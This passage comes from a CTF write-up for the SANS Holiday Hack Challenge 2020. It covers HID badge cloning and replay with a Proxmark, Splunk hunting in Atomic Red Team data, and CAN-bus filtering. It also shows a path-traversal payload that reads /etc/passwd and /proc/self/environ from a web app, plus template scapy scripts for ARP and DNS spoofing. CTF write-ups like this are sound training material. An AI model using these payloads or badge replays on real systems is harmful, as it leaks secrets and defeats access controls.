<p>Talk to Pepper Minstix in the entryway to get some hints about the Santavator.</p>
</blockquote>
<p>Pepper was our <a href=#unescape-tmux>unescape tmux</a> challenge elf, so after you finished that you&rsquo;d get some hints on how to operate the Santavator. Basically, you&rsquo;d pick up stuff lying around, including an all-important <em>elevator key</em>, pop open the button&rsquo;s panel and &ldquo;tweak&rdquo; the internals to make the buttons usable. The idea was to get the light particle source split up so that each coloured section would get enough particles to light up the section.</p>
<p>Unfortunately I have no idea where I picked most of the stuff I got such as nuts, lights and the key, but, you should be able to spot them lying around on the ground on the map pretty easily. Just walk around a bit and explore the rooms.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/player_items.png> <figcaption>
items picked up on the map accessible via your badge
</figcaption>
</figure>
<p>When you enter the elevator there is a panel you could click on in the bottom left.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santavator_panel_outside.png> <figcaption>
santavator panel outside. yellow light around a button means its usable.
</figcaption>
</figure>
<p>With the key, you could open it up and see the inside.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santavator_panel_inside.png> <figcaption>
santavator panel inside with my configuration that lit up all of the lights
</figcaption>
</figure>
<p>Activating a light should see you complete the objective. Close up the panel and hit the buttons for the floors you have available. Further poking (and a later challenge) showed that you can actually skip all of this and just make the buttons active regardless.</p>
<h3 id=5---open-hid-lock>5 - open hid lock<a hidden class=anchor aria-hidden=true href=#5---open-hid-lock>#</a></h3>
<blockquote>
<p>Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.</p>
</blockquote>
<p>Bushy Evergreen stood by the <a href=#speaker-unprep>Speaker UNPrep</a> terminal challenge, and once you complete the <a href=#lights>lights</a> challenge, we&rsquo;re told that the Proxmark can simulate badges. Alright, again, I can&rsquo;t remember where I picked up the proxmark, but just walking around everywhere you should spot it lying on the ground. Bushy also mentioned a talk that is super useful to understand the proxmark a little better: <a href="https://www.youtube.com/watch?v=647U85Phxgo">https://www.youtube.com/watch?v=647U85Phxgo</a></p>
<p>Once you have the proxmark you will find it on your badge under items.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/proxmark_item.png> <figcaption>
proxmark accessible from your badge
</figcaption>
</figure>
<p>Clicking on the &ldquo;Open Proxmark CLI&rdquo; button will show you this interface (as if you plugged the Proxmark into your computer)</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/proxmark_cli.png> <figcaption>
proxmark cli
</figcaption>
</figure>
<p>Since the challenge name specifically mentioned &ldquo;HID&rdquo;, there were only two commands/actions that were really interesting. The first to read (clone) existing HID devices on the map, and the second to replay one of those cards in the Workshop.</p>
<p>My approach was to just walk to each and every Elf I could find, open up the Proxmark CLI and running the <code>lf hid read</code> command, recording the card data in a text file.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/proxmark_cli_hid_read.png> <figcaption>
example hid read output
</figcaption>
</figure>
<p>All of the card data I gathered were:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>bow ninecandle (talks lobby)    - #db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023
shinny upatree (front lawn)     - #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
sparkle redberry (entryway)     - #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022
ginger breddie (entryway)       - #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022
angel candysalt (great room)    - #db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040
holly evergreen (kitchen)       - #db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024
noel boetie (wrapping room)     - #db# TAG ID: 2006e22ee1 (6000) - Format Len: 26 bit - FC: 113 - Card: 6000
</code></pre></div><p>Once I had all the cards I thought I could find, I went to the Workshop and ran the <code>lf hid sim</code> command for each tag I had scanned.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>
[magicdust] pm3 --&gt; lf hid sim -r 2006e22f13 --fc 113 --cn 6025
[=] Simulating HID tag using raw 2006e22f13
[=] Stopping simulation after 10 seconds.
[=] Done
</code></pre></div><p>Turns out, Skinny Upatree had a card that would unlock the Workshop door.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/unlocked_workshop_door.png> <figcaption>
unlocked workshop door
</figcaption>
</figure>
<p>Entering the room behind the door had me confused at first. It was dark with basically nothing inside it. I actually thought I hid a snag where my browser failed to render the room. Turns out that is exactly how the room should look, and if you move all the down you&rsquo;d see a light.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/workshop_room_light.png> <figcaption>
the only light in the workshop room
</figcaption>
</figure>
<p>Clicking this light as your normal avatar teleports you back to the Entry room, but, now you are Santa!</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/teleport_as_santa.png> <figcaption>
look, we are santa!
</figcaption>
</figure>
<p>At this stage you would have unlocked the rest of the objectives on your badge, and you could now do challenges such as the Splunk challenge that only Santa could do. Paying close attention to the narrative, many Elf&rsquo;s mentioned that Santa was acting strange. At this point it is clear that it was because of the ability we have to impersonate him.</p>
<h3 id=6---splunk-challenge>6 - splunk challenge<a hidden class=anchor aria-hidden=true href=#6---splunk-challenge>#</a></h3>
<blockquote>
<p>Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?</p>
</blockquote>
<p><strong>For this challenge you had to be playing as Santa (accessible after you completed <a href=#5---open-hid-lock>objective 5</a>)</strong></p>
<p><em>Angel Candysalt</em> stands next to a computer with the Splunk logo on it in the great room.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_angel_candysalt.png> <figcaption>
splunk computer in the great room
</figcaption>
</figure>
<p>Clicking the computer opened a new tab with a Splunk Web UI here: <a href=https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc>https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc</a>. Trying to browse to that URL without logging into the Kringlecon 3 challenge site would have you redirected to a login page, fwiw.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_web_ui.png> <figcaption>
splunk webui with the kringlesoc app open
</figcaption>
</figure>
<p>For this challenge you had to answer a few questions (seen on the right) based on an Adversary Simulation that had been run using the <a href=https://github.com/splunk/attack_range>Splunk Attack Range</a>. Conversations in the KringleSOC chats reveal these details to help you understand where the data is coming from. Once you are ready to start, the chat with &ldquo;Alice Bluebird'' would guide you through the rest of it.</p>
<p>Let&rsquo;s tackle those questions and the Search Processing Language (SPL) I used to solve them.</p>
<blockquote>
<ol>
<li>How many distinct MITRE ATT&CK techniques did Alice emulate?</li>
</ol>
</blockquote>
<p>Alice gave us an example search to use here <code>| tstats count where index=* by index</code>, so I just pasted that and manually counted the techniques to get to 13 haha!</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_search_example.png> <figcaption>
splunk example SPL for question 1
</figcaption>
</figure>
<p>Alice&rsquo;s (much better) search for this was apparently this, which gives you the count too:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>| tstats count where index=* by index 
| search index=T*-win OR T*-main
| rex field=index &#34;(?&lt;technique&gt;t\d+)[\.\-].0*&#34; 
| stats dc(technique)
</code></pre></div><blockquote>
<ol start=2>
<li>What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space)</li>
</ol>
</blockquote>
<p>For this one I just looked at my previous searches results and spotted &lsquo;em with my eye as <code>t1059.003-main t1059.003-win</code>. Easy.</p>
<blockquote>
<ol start=3>
<li>One technique that Santa had us simulate deals with &lsquo;system information discovery&rsquo;. What is the full name of the registry key that is queried to determine the MachineGuid?</li>
</ol>
</blockquote>
<p>This one was trickier. Because MITRE ATT&CK references don&rsquo;t actually include any attack details (or examples if you will), I opted to clone the <a href=https://github.com/redcanaryco/atomic-red-team>Atomic Red Team</a> repository and search through there for answers instead.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_atomic_red_team_search.png> <figcaption>
atomic red team search for MachineGuid
</figcaption>
</figure>
<p>I cross referenced Splunk search results to check that we actually ran T1082 (which we did), and inferred the registry key as <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</code>.</p>
<blockquote>
<ol start=4>
<li>According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)</li>
</ol>
</blockquote>
<p>OSTAP? Oh, right, malware. Much like the previous question, I searched for references in the Atomic Red Team repository and found that <a href=https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md>T1204</a> was related to this. Alice also gives an important hint here in that the index that gets used to record all simulations that were run is in <code>index=attack</code>. So, the final SPL to find the timestamp for me was: <code>index=attack ostap | sort _time</code>.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_question_4.png> <figcaption>
splunk question 4 search & result
</figcaption>
</figure>
<p>The answer was <code>2020-11-30T17:44:15Z</code>.</p>
<blockquote>
<ol start=5>
<li>One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?</li>
</ol>
</blockquote>
<p>This one was tricky for me as it took me a really long time to discover which parts were important from both the Github profile, the relevant project and the correct data in splunk. Anyways, we get a vague hint about someone&rsquo;s Github profile, asking us to find the PID of the first relevant process created for the technique.</p>
<p>Checking out the users Github profile, we find one project that <em>may</em> be relevant (based purely on eliminating the other projects they had). <a href=https://github.com/frgnca/AudioDeviceCmdlets>AudioDeviceCmdlets</a>. Searching for <code>AudioDeviceCmdlets</code> in the Atomic Red Team repository we find T1123, which we also have an index for in splunk. So, this must be the relevant TTP.</p>
<p>We&rsquo;re told that Event Code 1 is the event type we&rsquo;re interested in, and that is something Sysmon will give us, so we can add that to our search. At this point I had <code>index=t1123-win EventCode=1 *audio*</code> for my search. This narrowed the possibilities down to two events for me.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_question_5.png> <figcaption>
splunk question 5 search & result
</figcaption>
</figure>
<p>The first entry in the results was not specific to the AudioDeviceCmdlets component, so the only other option was <code>3648</code> found with the <code>index=t1123-win EventCode=1 *audio* | table process_id, cmdline</code> search.</p>
<blockquote>
<ol start=6>
<li>Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?</li>
</ol>
</blockquote>
<p>I think this one was the hardest. By now I have gotten into the habit of searching through the Atomic Red Team <code>atomics/</code> directory for details on how some of these techniques were run, but this time I couldn’t find any batch files with correct answers that they were asking for. So, I had to search purely in Splunk this time.</p>
<p>I figured that with command line auditing enabled we should be able to see at least where/how the batch file would get invoked, and hopefully as a result of the auditing see the subsequent commands in the bat file that were run as well. To narrow things down, I started with this search (removing splunk agents to reduce noise): <code>index=* cmdline=* cmdline!="*SplunkUniversalForwarder*" "*.bat*"</code>. This resulted in some Sysmon events I could spot, and adding <code>| stats count by index</code> to the search revealed T1059.003 and T1547.001. Great, however, the Atomic Red Team atomics for those weren&rsquo;t as useful as I had hoped (at least none of my answers worked haha).</p>
<p>To make the data more readable for me with the relevant parts, I tabled the columns I figured would be interesting and started working through those with <code>index=* cmdline=* cmdline!="*SplunkUniversalForwarder*" "*.bat*" | sort _time desc | table index, cmdline</code>.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_question_6a.png> <figcaption>
splunk question 6 search & result
</figcaption>
</figure>
<p>The very last entry in that list was a PowerShell command that downloaded a bat file from the atomic-red-team repository <a href=https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat>here</a>. Right at the end of that script we can see the <code>quser</code> command, which is also the answer!</p>
<blockquote>
<ol start=7>
<li>According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?</li>
</ol>
</blockquote>
<p>Alice gives us a hint that the Zeek logs are in an index that starts with <code>bro</code> by suggesting a search to start with: <code>index=* sourcetype=bro*</code>. To see all of the source types available I used this search: <code>index=* | stats count by sourcetype</code>. Because this question specifically asks for an x509 serial number, I refined my search to specifically the <code>bro:x509:json</code> source type with <code>index=* sourcetype="bro:x509:json"</code>. The very first result was for the Domain Controller and showed the serial number as <code>55FCEEBB21270D9249E86F4B9DC7AA60</code>.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_question_7.png> <figcaption>
splunk question 7 search & result
</figcaption>
</figure>
<blockquote>
<ol start=8>
<li>What is the name of the adversary group that Santa feared would attack KringleCon?</li>
</ol>
</blockquote>
<p>Alice gave us a hint and an encrypted phrase to decrypt: <code>7FXjP1lyfKbyDK/MChyf36h7</code>.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/splunk_question_8.png> <figcaption>
splunk encrypted phrase to decrypt
</figcaption>
</figure>
<p>For this challenge you had to have watched the talk that Angel Candysalt spoke about which had a very specific, awkward and weird pause on a slide with the words &ldquo;Stay Frosty&rdquo; on it <a href="https://youtu.be/RxVgEFt08kU?t=1121">here</a>. I solved the challenge using <a href=https://gchq.github.io/CyberChef>CyberChef</a> by base64 decoding the phrase Alice gave us, and RC4 decrypting it (after a quick Google for <code>RFC 7465</code>) using <code>Stay Frosty</code> as the passphrase to reveal the answer as <code>The Lollipop Guild</code>. A link to my solution using CyberChef is <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4(%7B'option':'UTF8','string':'Stay%20Frosty'%7D,'Latin1','Latin1')&input=N0ZYalAxbHlmS2J5REsvTUNoeWYzNmg3">here</a>.</p>
<h3 id=7---solve-the-sleighs-can-d-bus-problem>7 - solve the sleigh&rsquo;s can-d-bus problem<a hidden class=anchor aria-hidden=true href=#7---solve-the-sleighs-can-d-bus-problem>#</a></h3>
<blockquote>
<p>Jack Frost is somehow inserting malicious messages onto the sleigh&rsquo;s CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.</p>
</blockquote>
<p><strong>For this challenge you had to be playing as Santa (accessible after you completed <a href=#5---open-hid-lock>objective 5</a>)</strong></p>
<figure>
<img loading=lazy src=/images/holidayhack-20/sleigh_can_d_bus_santa.png> <figcaption>
santa by the sleigh in the netwars room
</figcaption>
</figure>
<p>Clicking on the Sleigh as Santa presented this interface with the messages on the right scrolling by really fast.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/sleigh_interface.png> <figcaption>
sleigh can-d-bus interface
</figcaption>
</figure>
<p>It takes a little while to get used to the interface, so clicking around and seeing the effects it has on the messages you see is highly encouraged.</p>
<p>From the <a href=#can-bus-investigation>CANBus investigation challenge</a> we learnt that messages have a type and a data field, separated by the <code>#</code>. As far as filtering goes, the Epoch and Time fields can be ignored. The ID and Message fields are important. My approach was to filter out everything that was just racing by so I could get the message log as quiet as possible. That meant I had the following rules at first.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/sleigh_all_filter.png> <figcaption>
sleigh filtering all default traffic
</figcaption>
</figure>
<p>With the message log quiet, I started to fiddle with the controls and filters to map which message ID&rsquo;s related to which feature. For example, I would toggle the Accelerator up (after starting the sleigh) and then remove filters to see which messages were being generated. Repeating that for each feature I ended with the following list.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>244 - Accelerator
080 - Brake
019 - Steering
02A - Start / Stop
19B - Lock / Unlock
</code></pre></div><p>With the mapping done, and keeping in mind the hint we received from Wunorse Openslae after completing the terminal, I focussed on the brakes and locks mechanism. This was mostly a trial and error thing, but in the end I had these two filters applied to remove messages that appeared to mess with the functioning of the sleigh.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>19B Equals      0000000F2057
080 Contains    FFFF
</code></pre></div><h3 id=8---broken-tag-generator>8 - broken tag generator<a hidden class=anchor aria-hidden=true href=#8---broken-tag-generator>#</a></h3>
<blockquote>
<p>Help Noel Boetie fix the <a href=https://tag-generator.kringlecastle.com/>Tag Generator</a> in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.</p>
</blockquote>
<p>The tag generator was available via the URL revealed in the objective here: <a href=https://tag-generator.kringlecastle.com/>https://tag-generator.kringlecastle.com/</a>. Browsing to it you&rsquo;d see:</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/broken_tag_generator.png> <figcaption>
broken tag generator ui
</figcaption>
</figure>
<p>This was actually one of the few web hacking challenges and was pretty simple. Fuzzing the UI, I tried to upload a text document.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/broken_tag_generator_error.png> <figcaption>
broken tag generator text file upload error
</figcaption>
</figure>
<p>The error displayed reveals a local path of a <code>.rb</code> file (so I guessed this was a Ruby web app), and what I am guessing is a temporary directory for processing uploads. Next, I uploaded a legitimate image which I figured the web app would allow. I opened the browser console to see what web traffic was generated with the upload, which revealed that an accepted image would be accessible from an image specific endpoint.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/broken_tag_generator_upload.png> <figcaption>
broken tag generator upload web traffic
</figcaption>
</figure>
<p>I opened the image URL in a new tab, which revealed the full URL as <a href="https://tag-generator.kringlecastle.com/image?id=a5471902-34bb-461c-80d7-2620c3d1bc66.png">https://tag-generator.kringlecastle.com/image?id=a5471902-34bb-461c-80d7-2620c3d1bc66.png</a>. At this stage I decided to fire up Burp Suite to test if the <code>id</code> field may be vulnerable to local file inclusion using an <code>id</code> of <code>../../../../etc/passwd</code>, which it was.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/broken_tag_generator_lfi.png> <figcaption>
broken tag generator lfi
</figcaption>
</figure>
<p>With LFI on Linux hosts you can query for a lot of interesting information from the <code>/proc</code> mount, and given that the challenge asked us to reveal what was stored in an environment variable, we could reveal that by reading <code>/proc/self/environ</code>.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/broken_tag_generator_answer.png> <figcaption>
broken tag generator `GREETZ` variable
</figcaption>
</figure>
<p><code>JackFrostWasHere</code> was the answer.</p>
<h3 id=9---arp-shenanigans>9 - arp shenanigans<a hidden class=anchor aria-hidden=true href=#9---arp-shenanigans>#</a></h3>
<blockquote>
<p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at <code>/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code>. Who recused herself from the vote described on the document?</p>
</blockquote>
<p><strong>For this challenge you had to be playing as Santa (accessible after you completed <a href=#5---open-hid-lock>objective 5</a>)</strong></p>
<figure>
<img loading=lazy src=/images/holidayhack-20/arp_shenanigans.png> <figcaption>
arp shenanigans challenge visible when playing as santa
</figcaption>
</figure>
<p>Oh boy, this was a fun one! The challenge had quite a few layers to it, each clearly following on the other as you process through it.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/arp_shenanigans_shell.png> <figcaption>
arp shenanigans initial shell
</figcaption>
</figure>
<p>The challenge drops you in a <code>tmux</code> session with one of the messages saying that we need to try and get control over 10.6.6.35 again. The suggested <code>HELP.md</code> file simply contained some basic unixy tips, and example pcaps you could look at for ARP & DNS traffic. There were some files & directories already present on the filesystem too.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>guest@b0fe959ddcac:~$ ls -l
total 16
-rw-r--r-- 1 guest guest  830 Dec  5 00:00 HELP.md
drwxr-xr-x 1 guest guest 4096 Dec  7 21:11 debs
lrwxrwxrwx 1 guest guest    9 Dec  7 21:11 motd -&gt; /etc/motd
drwxr-xr-x 1 guest guest 4096 Dec  1 15:27 pcaps
drwxr-xr-x 1 guest guest 4096 Dec  7 21:11 scripts
</code></pre></div><p>The <code>pcaps/</code> folder had some example ARP & DNS pcaps. The <code>scripts/</code> folder had two example scripts where <code>scapy</code> was used in one to generate an ARP reply, and a DNS answer in another. These two scripts contained some fields you had to complete.</p>
<p>The provided ARP script was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python3</span>
<span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
<span style=color:#f92672>import</span> netifaces <span style=color:#66d9ef>as</span> ni
<span style=color:#f92672>import</span> uuid

<span style=color:#75715e># Our eth0 ip</span>
ipaddr <span style=color:#f92672>=</span> ni<span style=color:#f92672>.</span>ifaddresses(<span style=color:#e6db74>&#39;eth0&#39;</span>)[ni<span style=color:#f92672>.</span>AF_INET][<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;addr&#39;</span>]
<span style=color:#75715e># Our eth0 mac address</span>
macaddr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;:&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{:02x}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format((uuid<span style=color:#f92672>.</span>getnode() <span style=color:#f92672>&gt;&gt;</span> i) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>8</span><span style=color:#f92672>*</span><span style=color:#ae81ff>6</span>,<span style=color:#ae81ff>8</span>)][::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handle_arp_packets</span>(packet):
    <span style=color:#75715e># if arp request, then we need to fill this out to send back our mac as the response</span>
    <span style=color:#66d9ef>if</span> ARP <span style=color:#f92672>in</span> packet <span style=color:#f92672>and</span> packet[ARP]<span style=color:#f92672>.</span>op <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
        ether_resp <span style=color:#f92672>=</span> Ether(dst<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;SOMEMACHERE&#34;</span>, type<span style=color:#f92672>=</span><span style=color:#ae81ff>0x806</span>, src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;SOMEMACHERE&#34;</span>)
        arp_response <span style=color:#f92672>=</span> ARP(pdst<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;SOMEMACHERE&#34;</span>)
        arp_response<span style=color:#f92672>.</span>op <span style=color:#f92672>=</span> <span style=color:#ae81ff>99999</span>
        arp_response<span style=color:#f92672>.</span>plen <span style=color:#f92672>=</span> <span style=color:#ae81ff>99999</span>
        arp_response<span style=color:#f92672>.</span>hwlen <span style=color:#f92672>=</span> <span style=color:#ae81ff>99999</span>
        arp_response<span style=color:#f92672>.</span>ptype <span style=color:#f92672>=</span> <span style=color:#ae81ff>99999</span>
        arp_response<span style=color:#f92672>.</span>hwtype <span style=color:#f92672>=</span> <span style=color:#ae81ff>99999</span>
        arp_response<span style=color:#f92672>.</span>hwsrc <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SOMEVALUEHERE&#34;</span>
        arp_response<span style=color:#f92672>.</span>psrc <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SOMEVALUEHERE&#34;</span>
        arp_response<span style=color:#f92672>.</span>hwdst <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SOMEVALUEHERE&#34;</span>
        arp_response<span style=color:#f92672>.</span>pdst <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SOMEVALUEHERE&#34;</span>
        response <span style=color:#f92672>=</span> ether_resp<span style=color:#f92672>/</span>arp_response
        sendp(response, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eth0&#34;</span>)

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    <span style=color:#75715e># We only want arp requests</span>
    berkeley_packet_filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;(arp[6:2] = 1)&#34;</span>
    <span style=color:#75715e># sniffing for one packet that will be sent to a function, while storing none</span>
    sniff(filter<span style=color:#f92672>=</span>berkeley_packet_filter, prn<span style=color:#f92672>=</span>handle_arp_packets, store<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, count<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    main()
</code></pre></div><p>And the provided DNS script was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python3</span>
<span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
<span style=color:#f92672>import</span> netifaces <span style=color:#66d9ef>as</span> ni
<span style=color:#f92672>import</span> uuid

<span style=color:#75715e># Our eth0 IP</span>
ipaddr <span style=color:#f92672>=</span> ni<span style=color:#f92672>.</span>ifaddresses(<span style=color:#e6db74>&#39;eth0&#39;</span>)[ni<span style=color:#f92672>.</span>AF_INET][<span style=color:#ae81ff>0</span>][<span style=color:#e6db74>&#39;addr&#39;</span>]
<span style=color:#75715e># Our Mac Addr</span>
macaddr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;:&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{:02x}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format((uuid<span style=color:#f92672>.</span>getnode() <span style=color:#f92672>&gt;&gt;</span> i) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>8</span><span style=color:#f92672>*</span><span style=color:#ae81ff>6</span>,<span style=color:#ae81ff>8</span>)][::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
<span style=color:#75715e># destination ip we arp spoofed</span>
ipaddr_we_arp_spoofed <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10.6.1.10&#34;</span>

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handle_dns_request</span>(packet):
    <span style=color:#75715e># Need to change mac addresses, Ip Addresses, and ports below.</span>
    <span style=color:#75715e># We also need</span>
    eth <span style=color:#f92672>=</span> Ether(src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;00:00:00:00:00:00&#34;</span>, dst<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;00:00:00:00:00:00&#34;</span>)   <span style=color:#75715e># need to replace mac addresses</span>
    ip  <span style=color:#f92672>=</span> IP(dst<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>, src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>)                          <span style=color:#75715e># need to replace IP addresses</span>
    udp <span style=color:#f92672>=</span> UDP(dport<span style=color:#f92672>=</span><span style=color:#ae81ff>99999</span>, sport<span style=color:#f92672>=</span><span style=color:#ae81ff>99999</span>)                             <span style=color:#75715e># need to replace ports</span>
    dns <span style=color:#f92672>=</span> DNS(
        <span style=color:#75715e># MISSING DNS RESPONSE LAYER VALUES </span>
    )
    dns_response <span style=color:#f92672>=</span> eth <span style=color:#f92672>/</span> ip <span style=color:#f92672>/</span> udp <span style=color:#f92672>/</span> dns
    sendp(dns_response, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eth0&#34;</span>)

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    berkeley_packet_filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34; and &#34;</span><span style=color:#f92672>.</span>join( [
        <span style=color:#e6db74>&#34;udp dst port 53&#34;</span>,                              <span style=color:#75715e># dns</span>
        <span style=color:#e6db74>&#34;udp[10] &amp; 0x80 = 0&#34;</span>,                           <span style=color:#75715e># dns request</span>
        <span style=color:#e6db74>&#34;dst host </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(ipaddr_we_arp_spoofed),    <span style=color:#75715e># destination ip we had spoofed (not our real ip)</span>
        <span style=color:#e6db74>&#34;ether dst host </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(macaddr)             <span style=color:#75715e># our macaddress since we spoofed the ip to our mac</span>
    ] )
    <span style=color:#75715e># sniff the eth0 int without storing packets in memory and stopping after one dns request</span>
    sniff(filter<span style=color:#f92672>=</span>berkeley_packet_filter, prn<span style=color:#f92672>=</span>handle_dns_request, store<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eth0&#34;</span>, count<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    main()
</code></pre></div><p>These two scripts were definitely very useful. But, to know where to start, we had to check out what traffic we could see on the host we do have access to. Using <code>tcpdump</code> we can do just that.</p>
